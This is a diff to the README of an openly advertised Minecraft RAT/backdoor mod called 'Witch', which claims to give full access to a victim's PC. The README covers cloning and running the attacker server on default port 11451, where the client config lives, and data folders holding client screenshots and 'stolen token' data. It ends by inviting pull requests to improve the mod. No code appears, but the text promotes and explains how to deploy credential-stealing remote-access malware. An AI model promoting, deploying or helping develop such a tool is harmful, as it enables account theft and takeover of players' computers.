@@ -7,11 +7,11 @@ New generation Minecraft RAT / Backdoor Mod.
 
 The Witch system controls Minecraft clients and grant full access to your victim's PC.
 
-**Forge will never be supported.**
+**Forge will never be supported. I will not backport it to older versions.**
 
-**I will not backport it to older versions.**
+## Known issues
 
-**I will not make a server backdoor mod for fabric.**
+- Obfuscated jar won't work
 
 ## Features
 
@@ -25,7 +25,6 @@ The Witch system controls Minecraft clients and grant full access to your victim
 ### Server
 
 * [ ] Client: Build system working
-
 - [ ] Better logging
 - [ ] Web UI
 
@@ -79,18 +78,18 @@ The Witch system controls Minecraft clients and grant full access to your victim
 - Lagger
 - [ ] Infection
 
-### Running
+## Running
 
 1. Run `git clone https://github.com/ThebestkillerTBK/witch.git`
 2. Open in your favorite IDE
 
-### Using
+## Using
 
 * Server: `java -jar server.jar <port>`
 * Default port and name: `11451`
 * Client config in Cfg.java
 
-#### Files:
+### Files:
 
 * Data root folder is `data`
 * screenshots - Client screenshot
@@ -98,7 +97,7 @@ The Witch system controls Minecraft clients and grant full access to your victim
 * skins - Player skins
 * data - Stolen token, config, etc.
 
-### Contributing to the project
+## Contributing to the project
 
 * Create PRs to make this mod better!
 * Leave a star if you like it!
